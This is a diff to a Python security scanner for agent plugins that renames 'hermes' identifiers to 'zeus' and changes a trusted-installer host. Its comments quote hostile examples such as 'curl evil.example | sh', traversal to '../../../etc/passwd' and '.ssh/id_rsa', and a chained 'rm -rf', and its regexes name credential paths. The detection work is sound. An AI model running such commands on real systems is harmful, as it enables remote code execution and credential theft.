@@ -38,7 +38,7 @@ _PROSE_KEEPS_FULL_SEVERITY_IDS = {
     "context_exfil", "send_to_url", "md_image_exfil", "md_link_exfil", "ssh_backdoor",
     "curl_pipe_shell", "wget_pipe_shell", "curl_pipe_python",
     "agent_config_mod", "agent_config_mod_shell", "agent_config_contract", "agent_config_ref",
-    "hermes_config_mod", "hermes_config_mod_shell", "hermes_config_ref",
+    "zeus_config_mod", "zeus_config_mod_shell", "zeus_config_ref",
     "other_agent_config_mod", "other_agent_config_mod_shell", "other_agent_config_ref",
 }
 # Agent instruction surfaces inside a plugin — a bundled skill tree and the post-install note
@@ -90,14 +90,14 @@ def prose_cap(finding: Finding) -> Optional[str]:
 # ``curl_pipe_shell`` keeps full severity in prose because a README — and a CI workflow — is exactly
 # where a malicious download-and-execute one-liner would be planted (``curl evil.example | sh`` in a
 # ``.github/workflows`` step stays ``high``). The documented, non-attack shape is a pipe whose URL is a
-# NAMED trusted installer: Hermes' own ``install.sh``, a named upstream runtime (``ollama.com``,
+# NAMED trusted installer: Zeus' own ``install.sh``, a named upstream runtime (``ollama.com``,
 # ``bun.sh``, ``get.docker.com``, ``sh.rustup.rs`` …), a named dev-tool CLI (``app.factory.ai``), or a
 # GitHub ``raw`` URL whose path is an ``install`` script. That lands at medium (a note). An unpinned /
 # unknown third-party domain — the attack shape — keeps full severity, in README, code, OR CI.
 _PIPE_TO_SHELL_IDS = {"curl_pipe_shell", "wget_pipe_shell", "curl_pipe_python"}
 _URL_IN_LINE = re.compile(r'https?://([^\s/"\'`)]+)([^\s"\'`)]*)')
 _TRUSTED_INSTALLER_HOSTS = {
-    "hermes-agent.nousresearch.com", "ollama.com", "bun.sh",
+    "charanbalaji2005.github.io/Zeus-Agents", "ollama.com", "bun.sh",
     "get.docker.com", "sh.rustup.rs", "deno.land", "astral.sh", "app.factory.ai",
 }
 
@@ -123,12 +123,12 @@ def is_trusted_installer_pipe(finding: Finding, line: str) -> bool:
 # ── (1b) language-pack catalogs ─────────────────────────────────────────────────────────────
 # ``locales/<lang>[.tui|.desktop].yaml`` in a ``provides_locales`` plugin is user-facing UI text
 # the loader reads as string leaves and shows to a human; nothing in it is executed or edits a
-# file, so the agent-config/hermes-config family steps down like any other prose (the bundled
+# file, so the agent-config/zeus-config family steps down like any other prose (the bundled
 # ``en.yaml`` itself matches ``updating: "... AGENTS.md"``). Injection shapes and leaked keys
 # keep full severity: a pack can still carry model-directed text.
 _CATALOG_STEPS_DOWN_IDS = {
     "agent_config_mod", "agent_config_mod_shell", "agent_config_contract", "agent_config_ref",
-    "hermes_config_mod", "hermes_config_mod_shell", "hermes_config_ref",
+    "zeus_config_mod", "zeus_config_mod_shell", "zeus_config_ref",
     "other_agent_config_mod", "other_agent_config_mod_shell", "other_agent_config_ref",
 }
 _LOCALE_CATALOG_SUFFIXES = {".yaml", ".yml"}
@@ -150,20 +150,20 @@ def catalog_cap(finding: Finding) -> Optional[str]:
     return prose_cap(finding)
 
 
-# A README "Uninstall" section removing the plugin's OWN install directory under ``~/.hermes`` is the one
+# A README "Uninstall" section removing the plugin's OWN install directory under ``~/.zeus`` is the one
 # destructive shape that is harmless by construction: one ``rm``, every operand rooted at
-# ``$HOME``/``${HOME}``/``~`` + ``/.hermes/`` with a plain segment path and a plain leaf — no glob, no
+# ``$HOME``/``${HOME}``/``~`` + ``/.zeus/`` with a plain segment path and a plain leaf — no glob, no
 # ``..``, nothing chained. Documented shapes: ``plugins/<name>`` / ``skills/<name>``, a profile-scoped
 # ``profiles/<profile>/{plugins,roles,...}/<name>``, ``desktop-plugins/<name>``, and the plugin's own
-# data dir ``~/.hermes/<name>`` — and up to a few such operands on one line (``rm -rf ~/.hermes/profiles/N/plugins/crew
-# ~/.hermes/profiles/N/roles/crew``). It lands at medium (a note). A wider target (``$HOME``, ``$HOME/.hermes``,
-# ``$HOME/.hermes/plugins/*``) only gets the generic prose step (high, caution) and the same line in a ``.sh``
+# data dir ``~/.zeus/<name>`` — and up to a few such operands on one line (``rm -rf ~/.zeus/profiles/N/plugins/crew
+# ~/.zeus/profiles/N/roles/crew``). It lands at medium (a note). A wider target (``$HOME``, ``$HOME/.zeus``,
+# ``$HOME/.zeus/plugins/*``) only gets the generic prose step (high, caution) and the same line in a ``.sh``
 # stays critical (#115353).
-_UNINSTALL_HOME = r'(?:\$HOME|\$\{HOME\}|~)/\.hermes'
+_UNINSTALL_HOME = r'(?:\$HOME|\$\{HOME\}|~)/\.zeus'
 
 
 def _uninstall_operand(group: str) -> str:
-    """One ``~/.hermes/<segments>/<leaf>`` operand, optionally quoted (quote tracked by *group*)."""
+    """One ``~/.zeus/<segments>/<leaf>`` operand, optionally quoted (quote tracked by *group*)."""
     return (rf'(?P<{group}>["\']?)' + _UNINSTALL_HOME
             + rf'(?:/[A-Za-z0-9][A-Za-z0-9._-]*)+/?(?P={group})')
 
@@ -178,8 +178,8 @@ _SELF_UNINSTALL_RM = re.compile(
 )
 
 # The same shape embedded in a backtick code span mid-prose (``… When you're done, `rm -rf
-# ~/.hermes/profiles/lancedb-demo` removes all trace``): the span must contain ONLY the ``rm`` and its
-# ``~/.hermes`` operands and then close (no chaining, no ``&&``, no trailing command), so a chained or
+# ~/.zeus/profiles/lancedb-demo` removes all trace``): the span must contain ONLY the ``rm`` and its
+# ``~/.zeus`` operands and then close (no chaining, no ``&&``, no trailing command), so a chained or
 # force-push example (``rm -rf ~/x && git push --force``) does not qualify.
 _SELF_UNINSTALL_RM_IN_SPAN = re.compile(
     r'`(?:\$\s*)?rm\s+(?:-[a-zA-Z]+\s+)*'
@@ -494,12 +494,12 @@ def is_quoted_injection_phrase(finding: Finding, line: str) -> bool:
 # out of a nested package to the repository root. Those ``..`` segments resolve to a known ancestor of
 # the plugin, not into a victim's tree. When every ``../../..`` run on the line is followed only by
 # more ``..``/path separators or a quote/paren (no SENSITIVE leaf — ``etc``, ``passwd``, ``shadow``,
-# ``.ssh``, ``.aws``, ``.env``, ``.hermes``, ``.gnupg``, ``.kube``, ``.docker``, ``.npmrc`` …), the
+# ``.ssh``, ``.aws``, ``.env``, ``.zeus``, ``.gnupg``, ``.kube``, ``.docker``, ``.npmrc`` …), the
 # finding is a note. A traversal INTO a sensitive path (``../../../etc/passwd``, ``../../../.ssh/id_rsa``)
 # keeps full severity.
 _TRAVERSAL_RUN = re.compile(r"(?:\.\./)+\.\.")
 _SENSITIVE_AFTER_TRAVERSAL = re.compile(
-    r"(?:/|\\)*(?:etc\b|passwd\b|shadow\b|\.ssh\b|\.aws\b|\.env\b|\.hermes\b|\.gnupg\b|\.kube\b"
+    r"(?:/|\\)*(?:etc\b|passwd\b|shadow\b|\.ssh\b|\.aws\b|\.env\b|\.zeus\b|\.gnupg\b|\.kube\b"
     r"|\.docker\b|\.netrc\b|\.npmrc\b|\.pypirc\b|\.config\b|proc\b|root\b|home\b|var\b|usr\b|sys\b)",
     re.IGNORECASE)
 
@@ -549,15 +549,15 @@ def is_benign_lazy_os_import(finding: Finding, line: str) -> bool:
 
 
 # ── (6c) a disclosed, scoped config-write NOTE in install docs ───────────────────────────────────
-# ``hermes_config_mod`` (the prose-intent tier, ``high``) fires on install docs that transparently state
+# ``zeus_config_mod`` (the prose-intent tier, ``high``) fires on install docs that transparently state
 # the plugin writes its OWN scoped config section — ``after-install.md``: "Write ``memory.provider:
-# mindgraph`` to ``~/.hermes/config.yaml``", a README "writes **only** the ``memlock:`` section". A
+# mindgraph`` to ``~/.zeus/config.yaml``", a README "writes **only** the ``memlock:`` section". A
 # README already takes the generic prose cap; ``after-install.md`` is agent-facing and does not, yet a
 # disclosed scoped write is a reviewable behaviour, not an attack. The PROSE tier on a doc/after-install
 # file caps to a note (medium): the finding stays visible, the verdict is not blocked. The MECHANICAL
-# shell-write tier (``hermes_config_mod_shell``, ``>>``/``sed -i``/``tee`` into config.yaml) is never
+# shell-write tier (``zeus_config_mod_shell``, ``>>``/``sed -i``/``tee`` into config.yaml) is never
 # demoted here and keeps full severity.
-_DISCLOSED_CONFIG_PROSE_IDS = {"hermes_config_mod"}
+_DISCLOSED_CONFIG_PROSE_IDS = {"zeus_config_mod"}
 _AGENT_DOC_NAMES = {"after-install.md"}
 
 
